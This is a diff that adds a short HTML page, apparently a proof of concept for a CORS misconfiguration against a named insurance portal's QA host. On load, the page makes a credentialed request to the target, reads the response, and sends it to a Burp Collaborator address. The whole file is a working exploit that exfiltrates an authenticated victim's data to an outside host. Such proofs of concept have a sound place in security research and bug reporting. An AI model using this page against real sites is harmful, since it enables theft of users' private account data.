@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <script>
+         function cors() {
+            var xhttp = new XMLHttpRequest();
+                xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+			var x = this.responseText;
+			
+			document.getElementById("demo").innerHTML = fetch("http://iqcl5c00l35me6d8y74pie87pyvpje.burpcollaborator.net/" + encodeURIComponent(x));
+					}
+         };
+         xhttp.open("GET", "http://qa.myportal.ascinsurance.site:8880/", true);
+         xhttp.withCredentials = true;
+         xhttp.send();}
+      </script>
+   </head> 
+   <body>
+      <center>
+	  <div id="demo">
+	  <img src="https://i.stack.imgur.com/EhGbL.png">
+	  <script>window.onload = cors(); </script>
+        <!--<button type="button" onload="cors()">Exploit</button>-->
+      </div>
+   </body>
+</html>
